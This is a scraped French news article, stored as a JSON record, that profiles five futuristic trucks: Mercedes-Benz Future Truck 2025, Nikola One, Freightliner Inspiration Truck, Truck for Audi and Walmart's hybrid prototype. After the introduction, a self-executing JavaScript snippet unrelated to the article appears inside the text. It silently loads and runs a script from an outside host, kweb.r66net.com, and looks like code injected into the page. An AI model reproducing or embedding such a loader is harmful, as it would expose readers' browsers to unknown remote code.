{"title": "Top 5 des camions du futur", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-05-01", "content": "Les technologies de conduite autonome et la propulsion electrique ne sont pas reservees seulement aux voitures. En fait, elles sont meme en train de preparer une revolution majeure dans le transport par camions dont nous devrions voir les resultats bien avant la voiture sans chauffeur. Il est desormais assez vraisemblable que d'ici quelques annees,des convois de poids lourds semi-autonomes interconnectes sillonneront nos routes. A la cle, une optimisation de la logistique pour les transporteurs et la promesse d'une securite accrue accompagnee d'une reduction des  emissions  polluantes. Recemment, un concours baptise  European Truck Platooning Challenge  a d'ailleurs permis de demontrer la viabilite d'un convoi de camions autonomes. Les principaux constructeurs de poids lourds (DAF, Daimler Truck, Iveco, Man, Scania, Volvo...) travaillent sur ces camions de demain. Mais ils vont devoir faire face a une concurrence inattendue de la part d'acteurs exterieurs alleches par les perspectives economiques prometteuses qu'ouvre le transport de marchandises automatise. C'est le cas par exemple d'Uber, le service de  voiture  de transport avec chauffeur, qui a fait l'acquisition d' Otto , une jeune pousse nord-americaine qui travaille sur un kit pour doter les poids lourds de fonctions de conduite autonome.  Tesla Motors  a egalement annonce son intention de concevoir un poids baptise  Tesla  Semi.  Un certain nombre de ces camions high-tech existent deja, d'autres sont a venir. En route pour notre selection !   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Mercedes-Benz Future Truck 2025, le camion-bureau Le concept  Future Truck 2025  de  Mercedes-Benz  est un laboratoire qui offre un apercu de ce que sera le camion autonome selon la celebre marque allemande. Le poids lourd est evidemment dote des technologies lui permettant de naviguer en surveillant le trafic pour s'adapter au moindre changement. La cabine ressemble davantage a un salon ou un bureau. Le chauffeur peut par exemple se consacrer aux taches administratives liees a sa mission. Mais c'est bien lui qui garde le controle et peut reprendre la main a tout moment. Le camion est ici une sorte d'assistant qui rend les longs trajets moins ereintants.  Mercedes-Benz a deja des prototypes de camions semi-autonomes prets a prendre la route. Mais la marque allemande explore aussi les concepts de demain (c) Mercedes-Benz                               Le Nikola One carbure a l'hydrogene Nikola Motor est une toute jeune entreprise nord-americaine qui veut jouer les trublions en promettant un camion << zero emission >>, propulse par un moteur electrique alimente par  hydrogene , qui sonnera le glas des  moteurs diesel . Grace a sa  pile a combustible , le  Nikola One , dont la sortie est prevue en decembre 2016, aurait une autonomie de pres de 2.000 kilometres. Nikola Motor compte se servir de fermes solaires dont l'electricite servira a produire l'hydrogene par  electrolyse  a partir de l'eau. Le Nikola One est cense etre disponible a la commercialisation a partir de decembre 2016. (c) Nikola Motor                                Freightliner Inspiration Truck, le premier camion semi-autonome Freightliner est une marque nord-americaine mythique dans l'histoire du poids lourd. Appartenant au groupe allemand Daimler (Mercedes-Benz), ce constructeur a concu un camion semi-autonome baptise  Freightliner Inspiration Truck . Il est equipe d'une serie de  capteurs  et de cameras qui lui permettent de surveiller son environnement proche et lointain avec une portee allant jusqu'a 250 metres et un champ de vision a 130deg. Lance en mai 2015, il s'agit du premier camion de ce type autorise a circuler sur routes ouvertes dans l'Etat du Nevada (Etats-Unis).  Le camion semi-autonome Freightliner est le premier du genre a circuler sur route ouverte aux Etats-Unis (c) Daimler                                Truck for Audi, camion ou vaisseau spatial ? A quoi pourrait ressembler un poids lourd concu par Audi ? Telle est la question a laquelle ont voulu repondre Artem Smirnov et Vladimir Panchenko. Ces deux designers ont pense le  Truck for Audi  sous deux formes radicalement differentes. Dans la version A, on retrouve le  style  epure et les lignes tendues typiques de la marque aux anneaux tandis que la version B nous projetterait plutot vers l' univers  de  Star Wars , cote obscur de la Force, avec un camion dont le double poste de pilotage est situe au sommet de la cabine facon cockpit de formule un. Ces deux concepts de camions Audi n'ont pas quitte la planche a dessin. Mais l'on aimerait assurement les voir sur nos routes! (c) Artem Smirnov et Vladimir Panchenko                                La version B du Truck for Audi est encore plus radicale. (c) Artem Smirnov et Vladimir Panchenko                                Walmart Advanced Vehicle Experience, un camion hybride en fibre de carbone L'enseigne de grande distribution nord-americaine Walmart dispose de sa propre flotte de 6.000 camions pour l' acheminement  de ses marchandises. C'est donc assez logiquement qu'elle explore les solutions techniques pour rendre ses poids lourds plus performants et plus propres. Le  Walmart Advanced Vehicle Experience  est un prototype de camion qui concretise cette reflexion. Propulse par une microturbine  hybride  positionnee dans le chassis sous la cabine, l'engin beneficie d'un carrossage tres aerodynamique qui contribue a reduire la consommation d' energie . Le chauffeur est installe en position centrale dans la cabine et il beneficie d'un tableau de bord dont l'instrumentation electronique est personnalisable. S'il n'est pour le moment pas dote d'une technologie de conduite autonome, ce prototype innove dans un autre domaine. Sa remorque est presque entierement faite de  fibre de carbone , ce qui permet un gain de poids enorme sans rogner sur la capacite de charge.  Le camion pense par Walmart mise beaucoup sur l'aerodynamique et l'usage de la fibre de carbone pour optimiser ses performances et sa consommation. (c) Walmart                               Voiture a hydrogene : une station-service hybride testee en Suisse                       Comme d'autres nations, la Suisse se prepare a l'arrivee massive des vehicules electriques et a hydrogene pour lesquels il faudra developper un reseau de distribution d'energie. C'est dans cette perspective que l'Ecole polytechnique federale de Lausanne a entrepris de tester un concept de station-service capable de recharger les voitures en electricite ou en hydrogene produits sur place et sans emissions de dioxyde de carbone.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  futur vie  |  futur  |  futur train  |  supermarche futur  |  bureau futur  |  autos du futur  |  futur nanotechnologie  |  homme du futur  |  passe futur  |  societe futur", "theme": "tech"}